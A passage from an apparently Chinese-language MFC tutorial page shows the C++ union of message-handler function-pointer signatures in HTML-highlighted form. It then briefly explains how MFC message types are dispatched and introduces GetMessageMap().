class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_b_NCCALCSIZEPARAMS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">,</span> NCCALCSIZE_PARAMS<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_v_WINDOWPOS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>WINDOWPOS<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_u_M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> HMENU<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_pr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> LPRECT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_u_s_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_MOUSEHWHEEL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token function\">LRESULT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_l_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_W_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_u_M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_v_MENUGETOBJECTINFO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>MENUGETOBJECTINFO<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_M_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_LPMDINEXTMENU<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> LPMDINEXTMENU<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_APPCOMMAND<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_RAWINPUT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> HRAWINPUT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_u_l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> LPARAM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_MOUSE_XBUTTON<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_MOUSE_NCXBUTTON<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_INPUTLANGCHANGE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_INPUTDEVICECHANGE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t<span class=\"token function\">LRESULT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_l_D_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CDC<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_F_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CFont<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> BOOL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token function\">HANDLE</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_h_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">HANDLE</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_h_b_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_v_ii<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token function\">HANDLE</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_h_h_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>HANDLE<span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_W_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> BOOL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t<span class=\"token comment\">// type safe variant for thread messages</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWinThread<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_THREAD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>WPARAM<span class=\"token punctuation\">,</span> LPARAM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token comment\">// specific type safe variants for WM_COMMAND and WM_NOTIFY messages</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_v_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_b_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_v_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_b_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnNotify_v_NMHDR_pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>NMHDR<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnNotify_b_NMHDR_pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>NMHDR<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnNotify_v_u_NMHDR_pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> NMHDR<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnNotify_b_u_NMHDR_pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> NMHDR<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmdUI_v_C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CCmdUI<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmdUI_v_C_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CCmdUI<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_v_pv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfnCmd_b_pv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token comment\">//OLD</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t<span class=\"token comment\">// specific type safe variants for WM-style messages</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token comment\">//\tBOOL    (AFX_MSG_CALL CWnd::*pfn_bD)(CDC*);</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token comment\">//\tBOOL    (AFX_MSG_CALL CWnd::*pfn_bb)(BOOL);</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\">//\tBOOL    (AFX_MSG_CALL CWnd::*pfn_bWww)(CWnd*, UINT, UINT);</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token comment\">//\tBOOL    (AFX_MSG_CALL CWnd::*pfn_bHELPINFO)(HELPINFO*);</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token comment\">//\tBOOL    (AFX_MSG_CALL CWnd::*pfn_bWCDS)(CWnd*, COPYDATASTRUCT*);</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token comment\">//\tHBRUSH  (AFX_MSG_CALL CWnd::*pfn_hDWw)(CDC*, CWnd*, UINT);</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token comment\">//\tHBRUSH  (AFX_MSG_CALL CWnd::*pfn_hDw)(CDC*, UINT);</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre><span class=\"token comment\">//\tint     (AFX_MSG_CALL CWnd::*pfn_iwWw)(UINT, CWnd*, UINT);</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token comment\">//\tint     (AFX_MSG_CALL CWnd::*pfn_iww)(UINT, UINT);</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token comment\">//\tint     (AFX_MSG_CALL CWnd::*pfn_iWww)(CWnd*, UINT, UINT);</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token comment\">//\tint     (AFX_MSG_CALL CWnd::*pfn_is)(LPTSTR);</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token comment\">//\tLRESULT (AFX_MSG_CALL CWnd::*pfn_lwl)(WPARAM, LPARAM);</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token comment\">//\tLRESULT (AFX_MSG_CALL CWnd::*pfn_lwwM)(UINT, UINT, CMenu*);</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vv)(void);</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vw)(UINT);</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vww)(UINT, UINT);</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vvii)(int, int);</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwww)(UINT, UINT, UINT);</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwii)(UINT, int, int);</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwl)(WPARAM, LPARAM);</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vbWW)(BOOL, CWnd*, CWnd*);</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vD)(CDC*);</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vM)(CMenu*);</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vMwb)(CMenu*, UINT, BOOL);</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vW)(CWnd*);</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vWww)(CWnd*, UINT, UINT);</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vWp)(CWnd*, CPoint);</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vWh)(CWnd*, HANDLE);</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwW)(UINT, CWnd*);</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwWb)(UINT, CWnd*, BOOL);</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwwW)(UINT, UINT, CWnd*);</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vwwx)(UINT, UINT);</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vs)(LPTSTR);</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vOWNER)(int, LPTSTR);   // force return TRUE</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token comment\">//\tint     (AFX_MSG_CALL CWnd::*pfn_iis)(int, LPTSTR);</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\">//\tUINT    (AFX_MSG_CALL CWnd::*pfn_wp)(CPoint);</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token comment\">//\tUINT    (AFX_MSG_CALL CWnd::*pfn_wv)(void);</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t<span class=\"token keyword\">void</span>    <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_vPOS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>WINDOWPOS<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t<span class=\"token keyword\">void</span>    <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_vCALC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">,</span> NCCALCSIZE_PARAMS<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t<span class=\"token keyword\">void</span>    <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_vwp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t<span class=\"token keyword\">void</span>    <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_vwwh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t<span class=\"token function\">BOOL</span>    <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_bwsp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token comment\">//\tvoid    (AFX_MSG_CALL CWnd::*pfn_vws)(UINT, LPCTSTR);</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>前面我们知道 MFC 有三大类消息，这里是判断了消息的类型，不同的类型的消息用不同的处理方法。</p>\n<h4 id=\"获取标准消息\"><a class=\"anchor\" href=\"#获取标准消息\">#</a> 获取标准消息</h4>\n<p>接下来看后面的代码：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> pMessageMap<span class=\"token punctuation\">;</span> pMessageMap <span class=\"token operator\">=</span> <span class=\"token function\">GetMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><strong>这里获取了 